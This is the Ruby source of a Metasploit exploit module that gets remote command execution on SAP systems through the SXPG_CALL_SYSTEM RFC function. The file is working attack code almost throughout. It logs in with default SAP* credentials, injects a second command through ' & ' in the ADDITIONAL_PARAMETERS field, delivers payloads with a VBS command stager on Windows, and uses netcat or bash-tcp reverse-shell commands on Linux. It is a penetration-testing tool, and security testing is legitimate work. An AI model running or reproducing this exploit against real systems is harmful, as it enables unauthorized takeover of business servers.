##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Exploit::Remote

  Rank = GreatRanking

  include Msf::Exploit::CmdStagerVBS
  include Msf::Exploit::EXE
  include Msf::Exploit::SAP::RFC

  def initialize
    super(
      'Name'           => 'SAP RFC SXPG_CALL_SYSTEM Remote Command Execution',
      'Description'    => %q{
        This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Platform'       => ['win', 'unix'],
      'Payload' => {
        'DisableNops' => true
      },
      'Targets' => [
        [ 'Linux',
          {
            'Arch'     => ARCH_CMD,
            'Platform' => 'unix',
            'Payload' => {
              'Space' => 236,
              'Compat' => {
                'PayloadType' => 'cmd cmd_bash',
                'RequiredCmd' => 'telnet netcat bash-tcp'
              },
            },
          }
        ],
        [ 'Windows x64',
          {
            'Arch' => ARCH_X86_64,
            'Platform' => 'win'
          }
        ]
      ],
      'DefaultTarget' => 0,
      'Privileged' => false,
      'Author' => [ 'nmonkee' ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Mar 26 2013'
    )

    register_options(
      [
        Opt::RHOST,
        OptString.new('CLIENT', [true, 'Client', '000']),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('COMMAND', [true, 'Command Name as in SM69', 'DBMCLI']),
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', '250']),
      ], self.class)
  end

  def exploit
    if target.name =~ /Windows/
      linemax = datastore['PAYLOAD_SPLIT']
      vprint_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Using custom payload size of #{linemax}") if linemax != 250
      print_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Sending RFC request")
      execute_cmdstager({ :delay => 0.35, :linemax => linemax })
    elsif target.name =~ /Linux/
      opts = {
        :rhost => rhost,
        :rport => rport,
        :client => client,
        :user => datastore['USERNAME'],
        :pass => datastore['PASSWORD'],
        :bg => true
      }

      res = dbmcli_sxpg_execute(target.name, payload.encoded, opts, true)
      vprint_line res if res
    end
  end

  def execute_command(cmd,opts)
    send_payload(cmd)
  end

  def send_payload(cmd)
    login(rhost, rport, client, datastore['USERNAME'], datastore['PASSWORD']) do |conn|
      exec(conn,cmd)
    end
  end

  def exec(conn, cmd)
    opts = {}
    if target.name =~ /Windows/
      opts[:COMMANDNAME] = datastore['COMMAND']
      opts[:ADDITIONAL_PARAMETERS] = " & #{cmd.strip}"
    end

    begin
      sxpg_call_system(conn, opts)
    rescue NWError => e
      print_error("[SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
      fail_with(Exploit::Failure::Unknown, "[SAP] Error injecting command")
    end
  end

end

